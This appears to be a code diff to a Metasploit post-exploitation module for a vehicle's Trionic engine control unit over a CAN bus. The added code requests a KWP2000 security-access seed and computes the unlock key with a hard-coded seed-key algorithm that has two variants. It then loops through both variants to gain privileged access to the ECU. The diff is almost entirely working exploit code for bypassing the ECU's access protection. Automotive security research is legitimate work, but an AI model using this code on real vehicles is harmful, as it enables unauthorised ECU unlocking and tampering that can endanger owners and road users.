@@ -87,6 +87,55 @@ class MetasploitModule < Msf::Post
     end
   end 
 
+  #
+  # Request security access
+  #
+  # @param bus [Integer] security level
+  # @return [String] engine type
+  def request_security_access(bus, method)
+#    print_status("Request security access (method #{method})")
+    response = send_kwp2000_request(bus, 0x240, 0x258, TARGET_TRIONIC, SECURITY_ACCESS, [0x05], {"MAXPKTS" => 1})
+
+    if response[0].hex == 0x05 and response.size > 2
+      seed = response[1].hex << 8 | response[2].hex
+    else
+      print_error("Could not receive seed")
+      return nil
+    end
+
+    # calculate key for seed and send request
+    key = calculate_key(seed, method)
+    response = send_kwp2000_request(bus, 0x240, 0x258, TARGET_TRIONIC, SECURITY_ACCESS, [0x06] + key, {"MAXPKTS" => 1})
+
+    if response[1].hex == 0x34
+#      print_good("Security access granted")
+      return true
+    else
+#      print_error("Security access denied")
+      return false
+    end
+  end 
+
+
+  #
+  # Calculate key for security access
+  #
+  # @param seed [Integer] seed for key calculation
+  # @param method [Integer] method for key calculation (0 or 1)
+  # @return [Integer] key
+  def calculate_key(seed, method)
+    key = seed << 2
+    if method == 1
+      key ^= 0x4081
+      key -= 0x1F6F
+    else
+      key ^= 0x8142
+      key -= 0x2356
+    end
+
+    return [key >> 8 & 0xff, key & 0xff]
+  end
+
 
   def run
     # start KWP2000 session
@@ -120,6 +169,14 @@ class MetasploitModule < Msf::Post
     software_version = read_ecu_id_data(datastore["CANBUS"], SOFTWARE_VERSION)
     unless software_version.nil?
       print_good("Software version: #{software_version}")
+    end
+
+    # check if security access is possible with known methods
+    for i in 0..1
+      if request_security_access(datastore["CANBUS"], i)
+        print_good("Security access granted (method #{i})")
+        break
+      end
     end
 
   end
